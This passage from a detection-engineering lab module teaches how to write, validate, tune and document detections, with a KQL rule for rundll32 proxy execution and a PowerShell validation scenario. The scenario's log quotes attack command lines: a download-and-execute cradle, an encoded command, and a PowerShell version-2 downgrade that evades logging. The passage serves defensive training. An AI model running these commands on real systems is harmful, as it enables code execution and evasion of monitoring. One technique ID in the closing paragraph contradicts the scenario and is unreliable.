This is the step where everything converges. Phase 2 gave you the strategy, Phase

## The detection lifecycle

```text
  Hypothesis  →  Write  →  Validate  →  Tune  →  Document  →  Review
      ▲                        │                                 │
      └────────────────────────┴─────────────────────────────────┘
             new gap found, or the environment changed
```

**Validate** and **Tune** are the two stages beginners skip, and they are the two
that separate a rule that exists from a rule that works.

## Writing: aim as high up the pyramid as your telemetry allows

You know the theory from Phase 2. Applied, the question is always: **what must the
attacker do that they cannot avoid?**

For each technique in your table, write down three candidate detections at
different heights, then pick the highest one your telemetry actually supports. If
you only collect process creation, a ProcessAccess-based rule is not available to
you no matter how much better it would be - and noting that gap is itself worth
recording.

<Callout type="key">
Write the rule against the **distinguishing field**, not the whole event. Your
technique-to-telemetry table already has a "distinguishing value" column - that
was the point of building it. `rundll32` with a `javascript:` command line is a
detection. `rundll32 ran` is not.
</Callout>

## Validation: the multi-atomic test

A rule that catches the atomic you wrote it against proves almost nothing. Most
techniques have several atomics representing different implementations, and the
real test is whether your rule catches more than one.

```powershell
# How many implementations exist for this technique?
Invoke-AtomicTest T1218.011 -ShowDetailsBrief

# Run each in turn, checking whether your rule fires
Invoke-AtomicTest T1218.011 -TestNumbers 1
Invoke-AtomicTest T1218.011 -TestNumbers 2
Invoke-AtomicTest T1218.011 -TestNumbers 3
```

This is the practical, testable version of the Pyramid of Pain. A rule catching
one of four atomics is sitting near the bottom; a rule catching all four is
detecting the behaviour.

## Tuning: measure, categorise, intervene narrowly

The five-step methodology from Phase 2, now with your own data:

1. **Measure.** Run the rule as a query over 7 to 14 days of lab data. How often
   would it have fired? How many were your atomics and how many were ordinary
   activity?
2. **Categorise the noise.** Group the false positives and find the *shared*
   property - the same parent, the same account, the same path.
3. **Intervene narrowly.** Prefer adding a condition over adding an exclusion.
   Never exclude by host or user alone.
4. **Document** the change and the reasoning.
5. **Re-measure**, and confirm your atomics still fire afterwards.

<Callout type="warn">
**Always re-run the atomic after tuning.** An exclusion written to remove noise can
silently remove the detection too - and a rule that no longer catches the attack
it was built for, while looking perfectly healthy, is worse than no rule at all
because it creates false confidence. This is the most important sentence in the
step.
</Callout>

## Documenting: the ADS template

Palantir's Alerting and Detection Strategy framework is the industry-standard way
to document a rule, and adopting it makes your portfolio look professional rather
than hobbyist:

```text
GOAL              What adversary behaviour is this trying to catch?
CATEGORISATION    ATT&CK technique ID and tactic
STRATEGY ABSTRACT High-level description of how it works
TECHNICAL CONTEXT The telemetry, fields and platform detail a reader needs
BLIND SPOTS       How would an attacker evade this? Be honest.
FALSE POSITIVES   Known benign triggers and how they are handled
VALIDATION        How it was tested - which atomics, which fired
PRIORITY          Severity and why
RESPONSE          What an analyst should do when it fires
```

The **blind spots** section is the one that impresses. Stating how your own
detection could be evaded demonstrates you understand its limits, which is the
opposite of the overclaiming that makes junior work look junior.

## Challenge - write a durable detection

<QueryChallenge
  step="track/05-lab/03-write-detections"
  id="rundll32-durable"
  title="Detect rundll32 proxy execution"
  lang="kql"
  tables={["DeviceProcessEvents", "FileName", "ProcessCommandLine", "InitiatingProcessFileName", "FolderPath", "DeviceName"]}
>
<div slot="brief">

Write a detection for **T1218.011 rundll32 proxy execution** that is durable
enough to catch multiple implementations, not just one atomic.

Consider: script-protocol command lines, execution from unusual paths, missing or
malformed DLL export arguments, and suspicious parent processes. Exclude the
obvious legitimate cases.

</div>
<div slot="solution">

```kql
let known_good_parents = dynamic([
    "ccmexec.exe","msiexec.exe","services.exe","svchost.exe","explorer.exe"
]);
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName =~ "rundll32.exe"
| extend Cmd = tolower(ProcessCommandLine)
| extend Signal = case(
    Cmd has_any ("javascript:", "vbscript:", "mshtml", "runhtmlapplication"),
        "script_protocol",
    Cmd matches regex @"rundll32(\.exe)?[""']?\s*$",
        "no_arguments",
    Cmd has_any (@"\appdata\", @"\temp\", @"\programdata\",
                 @"\users\public\", @"\downloads\"),
        "suspicious_path",
    Cmd has_any (".jpg", ".png", ".txt", ".log", ".dat")
        and Cmd has ",",
        "masquerading_extension",
    InitiatingProcessFileName in~
        ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","mshta.exe"),
        "office_parent",
    ""
)
| where isnotempty(Signal)
| where InitiatingProcessFileName !in~ (known_good_parents)
     or Signal in ("script_protocol", "office_parent", "no_arguments")
| project Timestamp, DeviceName, Signal, AccountName,
          InitiatingProcessFileName, ProcessCommandLine, FolderPath
| sort by Timestamp desc
```

**Why it is built this way:**

- **Five independent signals, not one.** Each corresponds to a different
  implementation, so the rule survives an attacker changing approach. A rule
  matching only `javascript:` catches one atomic; this catches several.
- **`no_arguments` is the strongest signal here.** `rundll32` exists to run a named
  export from a named DLL. With no arguments it is not doing its job at all - it is
  hosting injected code, which you met in the Phase 1 process-tree scenario.
- **The `Signal` column is deliberate.** It tells the triaging analyst *why* the
  rule fired, which turns a bare alert into a starting point. Detections that
  explain themselves get triaged faster and closed more accurately.
- **The exclusion is conditional, not blanket.** Known-good parents are excluded -
  but **not** for the three strongest signals. SCCM legitimately invokes rundll32,
  so excluding it reduces noise; but SCCM invoking rundll32 with a `javascript:`
  command line means SCCM is compromised, and that must still fire. This is the
  narrow-intervention principle from Phase 2 made concrete.

**Common wrong shapes:** matching only on `javascript:`, which catches one atomic;
excluding parents unconditionally, which hands an attacker a channel through the
deployment agent; using `contains` rather than `has_any`, which is markedly slower;
and forgetting `tolower()`, so a capitalised command line slips past.

**Validate it** by running all available T1218.011 atomics and recording which
signal each triggers. Any atomic that fires nothing is a gap in the rule, and
that gap belongs in your ADS blind-spots section.

</div>
</QueryChallenge>

<Scenario
  step="track/05-lab/03-write-detections"
  id="one-of-four"
  title="Your rule catches one atomic out of four"
  minutes={8}
>
<div slot="brief">

You wrote a detection for T1059.001 (PowerShell) keyed on encoded commands. You
validate it against the available atomics:

```text
T1059.001 validation run

Test 1  Mimikatz via download cradle          FIRED
        powershell -nop -exec bypass -c "IEX (New-Object
        Net.WebClient).DownloadString('http://...')"

Test 2  Base64-encoded command                FIRED
        powershell -enc SQBFAFgAIAAoAE4AZQB3...

Test 3  PowerShell via WMI                    DID NOT FIRE
        wmic process call create "powershell -c Get-Process"

Test 4  PowerShell downgrade attack           DID NOT FIRE
        powershell -version 2 -c "IEX(...)"

Rule logic:
  DeviceProcessEvents
  | where FileName =~ "powershell.exe"
  | where ProcessCommandLine has_any ("-enc", "-e ", "IEX",
                                      "DownloadString")
```

What does this tell you, and what do you do?

</div>
<div slot="model">

**It tells you the rule is sitting lower on the pyramid than you thought, and it
tells you precisely where.** Two of four is not a failure - it is a diagnostic, and
this is exactly why the multi-atomic test exists.

**Why tests 3 and 4 were missed, and they are missed for different reasons:**

**Test 3 - WMI-spawned PowerShell.** The rule did fire on nothing because the
command line is `powershell -c Get-Process` - no `-enc`, no `IEX`, no
`DownloadString`. My string list assumed obfuscation. The interesting signal here
is not the command line at all: it is the **parent process**. PowerShell spawned by
`wmiprvse.exe` is unusual and worth detecting regardless of what it runs. My rule
looked at the wrong field.

**Test 4 - version downgrade.** `-version 2` forces PowerShell 2.0, which **bypasses
script block logging and AMSI entirely**. The command line still contains `IEX`, so
in principle it should have matched - if it did not, the likely cause is that the
telemetry itself is thinner in v2, or the argument ordering broke my `has_any`
match. Either way, `-version 2` is itself one of the highest-fidelity signals in
Windows security, because there is essentially no legitimate reason to force it.
Its absence from my rule is the real gap.

**What I change:**

1. **Add parent-process logic.** PowerShell parented to `wmiprvse.exe`,
   `winword.exe`, `excel.exe`, `mshta.exe`, `services.exe` or a browser is
   suspicious irrespective of arguments. This catches test 3 and generalises to
   implementations I have not seen.
2. **Add `-version 2` / `-v 2` as a standalone high-severity signal.** Deliberate
   downgrade to evade logging is close to a confession.
3. **Add script block logging (event 4104) as a second data source.** Command-line
   detection is defeated by anything that obfuscates the invocation; script block
   logging captures the deobfuscated content at execution. If it is not enabled,
   that is a collection gap to close first - which is the Phase 2 lesson again.
4. **Split the rule.** The obfuscation signals, the parent-process signals and the
   downgrade signal have different fidelities and deserve different severities.
   One rule bundling all three either over-alerts or under-alerts.

**What I do not do:** widen the string list until every atomic matches. That
produces a brittle rule with a longer list of strings - still bottom-of-pyramid,
now noisier. The fix is to detect on different *properties*, not more *strings*.

**And I record it honestly.** The ADS blind-spots section for this rule now says:
"validated against four T1218 atomics; initially caught two. Missed WMI-spawned
execution (no obfuscation in command line) and version downgrade. Addressed by
adding parent-process and version-flag signals. Remaining blind spot: PowerShell
invoked via .NET runspaces without spawning powershell.exe at all, which requires
image-load telemetry not currently collected."

**That paragraph is worth more in an interview than a rule that caught all four
first time.** It shows testing, diagnosis, iteration, and honest documentation of
what is still uncovered - which is what detection engineering actually is.

</div>
</Scenario>
